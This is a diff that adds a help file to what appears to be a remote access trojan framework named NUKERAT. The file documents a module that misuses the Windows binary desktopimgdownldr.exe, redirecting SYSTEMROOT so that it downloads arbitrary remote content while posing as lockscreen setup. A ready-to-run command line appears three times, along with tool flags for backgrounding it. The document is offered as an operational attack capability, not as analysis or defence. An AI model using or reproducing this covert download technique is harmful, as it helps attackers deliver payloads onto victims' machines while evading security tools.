@@ -1,0 +1,21 @@
+ABOUT
+    Lock screen / desktop image downloader.
+    With SYSTEMROOT redirected, /lockscreenurl fetches arbitrary web
+    content while posing as lockscreen setup.
+
+USAGE:
+    set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
+
+ARGUMENTS:
+    /lockscreenurl:              Remote URL to download
+    /eventName:                  Handler event name
+
+EXAMPLES:
+    set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
